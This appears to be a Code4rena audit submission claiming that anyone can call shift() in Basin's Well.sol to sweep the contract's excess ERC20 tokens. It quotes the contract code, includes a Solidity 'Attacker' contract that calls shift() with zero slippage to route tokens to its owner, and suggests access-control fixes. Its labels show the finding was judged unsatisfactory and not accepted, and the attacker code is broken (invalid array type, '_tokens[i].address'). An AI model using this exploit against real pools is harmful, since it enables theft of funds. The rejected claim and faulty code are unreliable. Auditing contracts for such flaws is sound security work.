# #167: Anyone can call Well.sol  shift() function and withdraw Contract's  extra ERC20 tokens whichever this contract is holding . From Well's contract balance, extra tokens for shifting,  calculated  `amountOut`  for  passed `tokenOut` token can be withdrawn by attacker.
Labels: ['bug', '3 (High Risk)', 'unsatisfactory', 'edited-by-warden', 'duplicate-25']
Accepted: False

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L352-L377


# Vulnerability details

## Impact

Whichever type of ERC20 token Well contract is holding it can loose all extra tokens of all types in an amount  whatever is the difference
`reserves[j] -_calcReserve(wellFunction(), reserves, j, totalSupply())` comes for `tokenOut` token passed by attacker. Attacker can pass `minAmountout` 0 so `if` check always passes.

## Proof of Concept

### Vulnerable Code : [/src/Well.sol#L352-L377](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L352-L377)

```solidity
File: /src/Well.sol
352:  function shift(
        IERC20 tokenOut,
        uint256 minAmountOut,
        address recipient
       ) external nonReentrant returns (uint256 amountOut) {
        IERC20[] memory _tokens = tokens();
        uint256[] memory reserves = new uint256[](_tokens.length);

        // Use the balances of the pool instead of the stored reserves.
        // If there is a change in token balances relative to the currently
        // stored reserves, the extra tokens can be shifted into `tokenOut`.
        for (uint256 i; i < _tokens.length; ++i) {
            reserves[i] = _tokens[i].balanceOf(address(this));
        }
366:        uint256 j = _getJ(_tokens, tokenOut);
367:        amountOut = reserves[j] - _calcReserve(wellFunction(), reserves, j, totalSupply());

369:        if (amountOut >= minAmountOut) {
370:            tokenOut.safeTransfer(recipient, amountOut);
            reserves[j] -= amountOut;
            _setReserves(_tokens, reserves);
            emit Shift(reserves, tokenOut, amountOut, recipient);
        } else {
            revert SlippageOut(amountOut, minAmountOut);
        }
 377:   }
```

Attacker can call this above `shift()` function and pass `tokenOut` address after getting list of addresses of tokens hold by `Well.sol` contract from `tokens()` function of Well.sol contract. Whenever `_calcReserve(wellFunction(), reserves, j, totalSupply())` becomes lesser than `reserves[j]` for any token and extra tokens to be shifted ,then attacker can call `shift` function for that token and shift extra to his account without any stoppage. reserves[j] contain balance of contract of that token where j is the index of that token contract instance in \_tokens array and reserves contain contract balance for all those tokens whichever the contract is holding.

### [tokens() view Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L84C5-L86C6)

```solidity
File : /src/Well.sol
84: function tokens() public pure returns (IERC20[] memory ts) {
85:        ts = _getArgIERC20Array(LOC_VARIABLE, numberOfTokens());
86:    }
```

### [\_getJ() view Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L759C4-L766C6)

```solidity
File : /src/Well.sol
759: function _getJ(IERC20[] memory _tokens, IERC20 jToken) internal pure returns (uint256 j) {
        for (j; j < _tokens.length; ++j) {
            if (jToken == _tokens[j]) {
                return j;
            }
        }
        revert InvalidTokens();
    }
```

### [\_calcReserve() view Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L695C5-L703C1)

```solidity
File : /src/Well.sol
695: function _calcReserve(
        Call memory _wellFunction,
        uint256[] memory reserves,
        uint256 j,
        uint256 lpTokenSupply
    ) internal view returns (uint256 reserve) {
        reserve = IWellFunction(_wellFunction.target).calcReserve(reserves, j, lpTokenSupply, _wellFunction.data);
    }

```

### [wellFunction() pure Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L88C5-L92C6)

```solidity
File : /src/Well.sol
88: function wellFunction() public pure returns (Call memory _wellFunction) {
        _wellFunction.target = wellFunctionAddress();
        uint256 dataLoc = LOC_VARIABLE + numberOfTokens() * ONE_WORD;
        _wellFunction.data = _getArgBytes(dataLoc, wellFunctionDataLength());
    }

```

### Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {IWell, Call} from "src/interfaces/IWell.sol";
import {IERC20} from "oz/token/ERC20/utils/SafeERC20.sol";
import {IWellFunction} from "src/interfaces/IWellFunction.sol";

contract Attacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _wellContract) public {
        IWell well = IWell(_wellContract);
        IERC20 memory _tokens = well.tokens();
        uint256 _totalSupply = well.totalSupply();
        Call memory _wellFunction = well.wellFunction();
        uint256[] memory reserves = new uint256[](_tokens.length);
        for (uint256 i; i < _tokens.length; ++i) {
            reserves[i] = _tokens[i].balanceOf(_wellContract);
        }
        for (uint256 i; i < _tokens.length; i++) {
            uint256 balance = _tokens[i].balanceOf(_wellContract);
            uint256 calc = IWellFunction(_wellFunction.target).calcReserve(
                reserves,
                i,
                _totalSupply,
                _wellFunction.data
            );
            if (balance > calc) {
                uint256 profit = well.shift(_tokens[i], 0, owner);
            }
        }
    }

    function readyToAttack(
        address _wellContract
    ) public view returns (uint256, address) {
        IWell well = IWell(_wellContract);
        IERC20 memory _tokens = well.tokens();
        uint256 _totalSupply = well.totalSupply();
        Call memory _wellFunction = well.wellFunction();
        uint256[] memory reserves = new uint256[](_tokens.length);
        for (uint256 i; i < _tokens.length; ++i) {
            reserves[i] = _tokens[i].balanceOf(_wellContract);
        }
        for (uint256 i; i < _tokens.length; i++) {
            uint256 balance = _tokens[i].balanceOf(_wellContract);
            uint256 calc = IWellFunction(_wellFunction.target).calcReserve(
                reserves,
                i,
                _totalSupply,
                _wellFunction.data
            );
            if (balance > calc) {
                return (balance - calc, _tokens[i].address);
            }
        }
    }
}

```

You can see in the above contract how can attack happen.
Using this attacker we can first take all the list of tokens and totalSupply from Well.sol `tokens()` and `totalSupply()` functions respectively. Then from `wellFunction` get `data` and `target` to call `calcReserve` on WellFunction contract. Store all tokens balance of well contract into `reserves` array.
Now we can run a for loop for all `\_tokens` array tokens to know Well contract has extra tokens to shift. Mostly calls and calculations like Well.sol `shift` function.
Then call shift function to well contract and give token address to withdraw which you want to withdraw , minAmountOut 0 and owner of this attacker as recipient. By this attacker can get all the extra tokens, difference between balance and calc into his account.

There is also a view function to check attack is efficient or not. By checking which token and how much amount is ready to withdraw for attacker.

## Tools Used

Manual Review

## Recommended Mitigation Steps

1. Use proper access control so that only genuine caller Or Owner can call this.
2. Make a recipient mapping containing genuine recipient addresses where protocol wants to send extra tokens not malicious address.
3. Then implement proper checks for msg.sender and recipient. Send money/tokens based on msg.sender not for everyone. Take extra care when sending money/tokens to any address.















## Assessed type

Other